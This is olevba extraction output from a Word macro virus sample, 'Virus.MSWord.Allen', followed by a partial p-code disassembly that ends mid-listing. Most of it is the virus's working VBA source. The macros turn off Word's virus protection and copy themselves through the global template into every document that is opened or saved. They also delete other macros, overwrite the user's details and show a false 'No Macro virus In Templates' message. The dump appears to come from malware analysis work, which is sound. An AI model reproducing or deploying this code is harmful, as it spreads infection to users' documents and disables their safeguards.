olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Allen
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Allen - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: ./Virus.MSWord.Allen - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "My Love to LIGUINA ALLENA HIVIANTA QUESTASARI"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoExec.MAIN"
On Error GoTo tamat
Dim Bln
WordBasic.DisableInput 1
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Bln = WordBasic.Month(WordBasic.Now())
Dim Pesan1$, Pesan2$
Pesan1$ = "GepenkUajy96 Lahq"
Pesan2$ = "Cintaku tulus Buat sayangku Allena Hivianta Questasari"
WordBasic.ToolsOptionsUserInfo Name:="GepenkUajy96", Initials:="Allena", Address:="mlampah@hotmail.com" + Chr(13) + "Liguina Allena Hivianta Questasari"
     If Bln = 11 Then
      Assistant.Visible = True
        With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "SELAMAT ULANG TAHUN..ALLEN"
            .Heading = "God bless you"
            .Show
        End With
     End If
tamat:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Allen - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "My Love to LIGUINA ALLENA HIVIANTA QUESTASARI"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoOpen.MAIN"
Dim NFile$
Dim NMakro$
Options.VirusProtection = False
NFile$ = WordBasic.[FileName$]()
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy NMakro$, "Global:AutoExec"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:AutoOpen"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy NMakro$, "Global:FileOpen"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy NMakro$, "Global:FileSave"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:FileSaveAs"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy NMakro$, "Global:FileTemplates"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy NMakro$, "Global:FileMacro"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy NMakro$, "Global:ToolsMacro"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy NMakro$, "Global:ToolsCustomize"
      On Error GoTo tamat
      If Month(Now()) = 11 Then
      Assistant.Visible = True
        With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "SELAMAT ULANG TAHUN..ALLEN"
            .Heading = "My heart to you"
            .Show
        End With
       End If
tamat:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: ./Virus.MSWord.Allen - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "My Love to LIGUINA ALLENA HIVIANTA QUESTASARI"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileOpen.MAIN"
Dim TotalMacro
Dim i
Dim MN$
Dim FN$
Dim NFile$
Dim NMakro$
ReDim BadMacro__$(20)
Options.VirusProtection = False
WordBasic.DisableAutoMacros 1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
On Error GoTo -1: On Error GoTo tamat
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
TotalMacro = 0
For i = 1 To WordBasic.CountMacros(1)
    MN$ = WordBasic.[MacroName$](i, 1)
    BadMacro__$(i) = MN$
    TotalMacro = TotalMacro + 1
Next i
FN$ = WordBasic.[FileName$]()
If TotalMacro >= 1 Then
    For i = 1 To TotalMacro
        On Error GoTo -1: On Error GoTo tamat
        WordBasic.Organizer Delete:=1, Source:=FN$, Name:=BadMacro__$(i), Tab:=3
    Next i
WordBasic.FileSave
End If
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy "Global:ToolsMacro", NMakro$
tamat:
WordBasic.FileSave
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: ./Virus.MSWord.Allen - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "My Love to LIGUINA ALLENA HIVIANTA QUESTASARI"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileSave.MAIN"
Dim Lakukan
Dim NFile$
Dim NMakro$
WordBasic.FileSave
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
Lakukan = WordBasic.Dialog.FileSaveAs(dlg)
If Lakukan Then
    dlg.Format = 1
    WordBasic.FileSaveAs dlg
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy "Global:ToolsMacro", NMakro$
    End If
tamat:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: ./Virus.MSWord.Allen - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Dim NFile$
Dim NMakro$
Options.VirusProtection = False
NFile$ = WordBasic.[FileName$]()
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy NMakro$, "Global:AutoExec"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:AutoOpen"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy NMakro$, "Global:FileOpen"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy NMakro$, "Global:FileSave"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:FileSaveAs"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy NMakro$, "Global:FileTemplates"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy NMakro$, "Global:FileMacro"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy NMakro$, "Global:ToolsMacro"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy NMakro$, "Global:ToolsCustomize"
      On Error GoTo tamat
      If Month(Now()) = 11 Then
      Assistant.Visible = True
        With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "SELAMAT ULANG TAHUN..ALLEN"
            .Heading = "My heart to you"
            .Show
        End With
End If
tamat:
End Sub

-------------------------------------------------------------------------------
VBA MACRO Tools.bas 
in file: ./Virus.MSWord.Allen - OLE stream: 'Macros/VBA/Tools'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Attribute MAIN.VB_Description = "My Love to LIGUINA ALLENA HIVIANTA QUESTASARI"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.ToolsMacro.MAIN"
On Error GoTo tamat
Dim silit$
If Month(Now()) = 11 Then
      Assistant.Visible = True
        With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "SELAMAT ULANG TAHUN..ALLEN"
            .Heading = "Salam manis slalu"
            .Show
        End With
     Else
Assistant.Visible = True
        With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "No Macro virus In Templates"
            .Heading = "Attention:"
            .Show
        End With
        End If
tamat:
silit$ = "No macro in templates "
WordBasic.MsgBox silit$, "MS WORD 97 LAHQ"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Allen
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoExec - 2327 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError tamat 
' Line #3:
' 	Dim 
' 	VarDefn Bln
' Line #4:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	St Bln 
' Line #8:
' 	Dim 
' 	VarDefn Pesan1
' 	VarDefn Pesan2
' Line #9:
' 	LitStr 0x0011 "GepenkUajy96 Lahq"
' 	St Pesan1$ 
' Line #10:
' 	LitStr 0x0036 "Cintaku tulus Buat sayangku Allena Hivianta Questasari"
' 	St Pesan2$ 
' Line #11:
' 	LitStr 0x000C "GepenkUajy96"
' 	ParamNamed New 
' 	LitStr 0x0006 "Allena"
' 	ParamNamed Initials 
' 	LitStr 0x0013 "mlampah@hotmail.com"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0022 "Liguina Allena Hivianta Questasari"
' 	Add 
' 	ParamNamed Address 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsUserInfo 0x0003 
' Line #12:
' 	Ld Bln 
' 	LitDI2 0x000B 
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #14:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #15:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #16:
' 	LitStr 0x001A "SELAMAT ULANG TAHUN..ALLEN"
' 	MemStWith Then 
' Line #17:
' 	LitStr 0x000D "God bless you"
' 	MemStWith Heading 
' Line #18:
' 	ArgsMemCallWith Show 0x0000 
' Line #19:
' 	EndWith 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Label tamat 
' Line #22:
' 	EndSub 
' Macros/VBA/AutoOpen - 2992 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn NFile
' Line #3:
' 	Dim 
' 	VarDefn NMakro
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #7:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	St NMakro$ 
' Line #8:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #9:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #10:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #11:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #13:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	St NMakro$ 
' Line #14:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #16:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	St NMakro$ 
' Line #17:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #19:
' 	Ld NFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #20:
' 	Ld NMakro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #22:
' 	Ld NFile$ 
' 	LitStr 0x0006 ":Tools"
' 	Add 
' 	St NMakro$ 
' Line #23:
' 	Ld NMakro$ 
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #25:
' 	Ld NFile$ 
' 	LitStr 0x0006 ":Tools"
' 	Add 
' 	St NMakro$ 
' Line #26:
' 	Ld NMakro$ 
' 	LitStr 0x0010 "Global:FileMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #28:
' 	Ld NFile$ 
' 	LitStr 0x0006 ":Tools"
' 	Add 
' 	St NMakro$ 
' Line #29:
' 	Ld NMakro$ 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #31:
' 	Ld NFile$ 
' 	LitStr 0x0006 ":Tools"
' 	Add 
' 	St NMakro$ 
' Line #32:
' 	Ld NMakro$ 
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #33:
' 	OnError tamat 
' Line #34:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #36:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #37:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #38:
' 	LitStr 0x001A "SELAMAT ULANG TAHUN..ALLEN"
' 	MemStWith Then 
' Line #39:
' 	LitStr 0x000F "My heart to you"
' 	MemStWith Heading 
' Line #40:
' 	ArgsMemCallWith Show 0x0000 
' Line #41:
' 	EndWith 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Label tamat 
' Line #44:
' 	EndSub 
' Macros/VBA/FileOpen - 3432 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn TotalMacro
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn MN
' Line #5:
' 	Dim 
' 	VarDefn FN
' Line #6:
' 	Dim 
' 	VarDefn NFile
' Line #7:
' 	Dim 
' 	VarDefn NMakro
' Line #8:
' 	OptionBase 
' 	LitDI2 0x0014 
' 	Redim BadMacro__$ 0x0001 (As String)
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #11:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set dlg 
' Line #12:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #13:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #14:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #15:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #16:
' 	LitDI2 0x0000 
' 	St TotalMacro 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #18:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St MN$ 
' Line #19:
' 	Ld MN$ 
' 	Ld i 
' 	ArgsSt BadMacro__$ 0x0001 
' Line #20:
' 	Ld TotalMacro 
' 	LitDI2 0x0001 
' 	Add 
' 	St TotalMacro 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St FN$ 
' Line #23:
' 	Ld TotalMacro 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TotalMacro 
' 	For 
' Line #25:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #26:
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld FN$ 
' 	ParamNamed Source 
' 	Ld i 
' 	ArgsLd BadMacro__$ 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0004 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #31:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	St NMakro$ 
' Line #32:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #33:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #34:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #35:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #36:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #37:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	St NMakro$ 
' Line #38:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #39:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #40:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	St NMakro$ 
' Line #41:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #42:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #43:
' 	Ld NFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #44:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #45:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #46:
' 	Ld NFile$ 
' 	LitStr 0x0006 ":Tools"
' 	Add 
' 	St NMakro$ 
' Line #47:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #48:
' 	Label tamat 
' Line #49:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #50:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #51:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #52:
' 	EndSub 
' Macros/VBA/FileSave - 2499 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Lakukan
' Line #3:
' 	Dim 
' 	VarDefn NFile
' Line #4:
' 	Dim 
' 	VarDefn NMakro
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #6:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	St Lakukan 
' Line #9:
' 	Ld Lakukan 
' 	IfBlock 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #13:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	St NMakro$ 
' Line #14:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #16:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #17:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #19:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	St NMakro$ 
' Line #20:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #22:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	St NMakro$ 
' Line #23:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #25:
' 	Ld NFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #26:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #28:
' 	Ld NFile$ 
' 	LitStr 0x0006 ":Tools"
' 	Add 
' 	St NMakro$ 
' Line #29:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Label tamat 
' Line #32:
' 	EndSub 
' Macros/VBA/FileSaveAs - 2805 bytes
' Line #0:
' 	FuncDefn (Public Sub MAIN())
' Line #1:
' 	Dim 
' 	VarDefn NFile
' Line #2:
' 	Dim 
' 	VarDefn NMakro
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #6:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	St NMakro$ 
' Line #7:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #9:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #10:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #12:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	St NMakro$ 
' Line #13:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #15:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	St NMakro$ 
' Line #16:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #18:
' 	Ld NFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #19:
' 	Ld NMakro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #21:
' 	Ld NFile$ 
' 	LitStr 0x0006 ":Tools"
' 	Add 
' 	St NMakro$ 
' Line #22:
' 	Ld NMakro$ 
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #24:
